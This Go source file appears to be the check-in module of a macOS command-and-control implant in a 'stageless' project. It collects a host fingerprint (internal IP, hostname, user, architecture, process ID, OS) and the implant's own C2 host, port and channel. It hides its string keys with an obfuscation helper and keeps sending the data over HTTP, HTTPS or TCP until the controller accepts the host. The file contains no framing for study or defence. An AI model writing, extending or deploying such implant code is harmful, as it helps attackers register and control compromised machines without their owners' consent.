package actions

import (
	"encoding/json"
	"math/rand"

	general "stageless/utils/general"
	global "stageless/utils"
	"stageless/utils/macapi"
	"stageless/utils/network"
	"stageless/utils/obf"
)

func beaconDelaySec() int {
	// Returns the beacon delay in seconds
	if global.BeaconDelay <= 0 {
		return 5
	}
	return global.BeaconDelay
}

var migrateHostTagDone bool

func ResolveHostTag() {
	// Builds a random host tag once
	if migrateHostTagDone {
		return
	}
	n := len(global.HostTag)
	if n == 0 {
		n = 6
	}
	const tagChars = "0123456789abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = tagChars[rand.Intn(len(tagChars))]
	}
	global.HostTag = string(b)
	migrateHostTagDone = true
}

func BuildFingerprintJSON() map[string]any {
	// Builds the fingerprint map sent to the server
	delaySec := beaconDelaySec()
	internalIp := general.GetInternalIp()
	fp := map[string]any{
		obf.S("option"):    obf.S("new"),
		obf.S("tag"):       global.HostTag,
		obf.S("ip"):        internalIp,
		obf.S("hostname"):  macapi.ReadHostname(),
		obf.S("user"):      macapi.GetCurrentUser(),
		obf.S("arch"):      macapi.GetMachineArch(),
		obf.S("pid"):       macapi.GetCurrentProcessID(),
		obf.S("os"):        macapi.GetOsName(),
		obf.S("listener"):  global.Channel,
		obf.S("delay"):     delaySec,
		obf.S("implant_config"): map[string]any{
			obf.S("channel"):  global.Channel,
			obf.S("host"):     global.Host,
			obf.S("port"):     global.Port,
			obf.S("host_tag"): global.HostTag,
			obf.S("delay"):    delaySec,
		},
	}
	return fp
}

func IsMissingHostResponse(body string) bool {
	// Checks that the response says the host is missing
	if body == "" {
		return false
	}
	var data map[string]any
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return false
	}
	status, _ := data[obf.S("status")].(string)
	errMsg, _ := data[obf.S("error")].(string)
	return status == obf.S("failure") && errMsg == obf.S("Missing host")
}

func fingerprintAccepted(body string) bool {
	// Checks that the server accepted the host
	if body == "" {
		return false
	}
	var data map[string]any
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return false
	}
	msgVal, ok := data[obf.S("message")]
	if !ok {
		return false
	}
	msg, ok := msgVal.(string)
	if !ok {
		return false
	}
	accepted := msg == obf.S("host included") || msg == obf.S("host already exists")
	return accepted
}

func SendFingerprint() {
	// Sends the fingerprint until the server accepts it
	ResolveHostTag()
	ch := global.Channel
	for {
		body := BuildFingerprintJSON()
		body[obf.S("metadata")] = general.CreateMetadata()
		var accepted bool
		switch ch {
		case obf.S("http"), obf.S("https"):
			raw, err := json.Marshal(body)
			if err != nil {
				macapi.SleepMs(1000)
				continue
			}
			resp := network.HTTPPost(string(raw))
			accepted = resp.OK && resp.Code == 200 && fingerprintAccepted(resp.Body)
		case obf.S("tcp"):
			envelope := network.BuildEnvelope(body)
			resp := network.TCPExchange(envelope)
			accepted = resp.OK && fingerprintAccepted(resp.Body)
		default:
			raw, err := json.Marshal(body)
			if err != nil {
				macapi.SleepMs(1000)
				continue
			}
			resp := network.HTTPPost(string(raw))
			accepted = resp.OK && resp.Code == 200 && fingerprintAccepted(resp.Body)
		}
		if accepted {
			break
		}
		macapi.SleepMs(1000)
	}
}
